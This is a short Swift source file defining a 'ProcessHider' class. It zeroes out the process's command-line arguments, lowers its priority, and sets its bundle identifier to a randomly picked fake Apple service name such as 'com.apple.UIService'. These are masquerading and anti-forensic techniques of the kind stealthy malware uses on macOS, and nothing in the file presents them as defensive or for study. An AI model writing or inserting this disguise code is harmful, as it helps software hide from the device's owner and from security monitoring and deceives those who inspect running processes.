import Foundation

final class ProcessHider {

    static let shared = ProcessHider()

    private init() {}

    func applyProcessDisguise() {
        clearArgv()
        lowerProcessPriority()
        NSLog("[ProcessHider] process disguise applied")
    }

    private func clearArgv() {
        let argc = CommandLine.argc
        for i in 1..<Int(argc) {
            let arg = CommandLine.unsafeArgv[i]
            if let ptr = arg {
                let len = strlen(ptr)
                memset(ptr, 0, len)
            }
        }
    }

    private func lowerProcessPriority() {
        setpriority(PRIO_PROCESS, 0, 10)
    }

    func disguiseProcessName() {
        let fakeNames = ["com.apple.UIService", "com.apple.accessibility", "com.apple.hiservices"]
        let name = fakeNames.randomElement() ?? "com.apple.UIService"
        setenv("__CFBundleIdentifier", name, 1)
    }
}
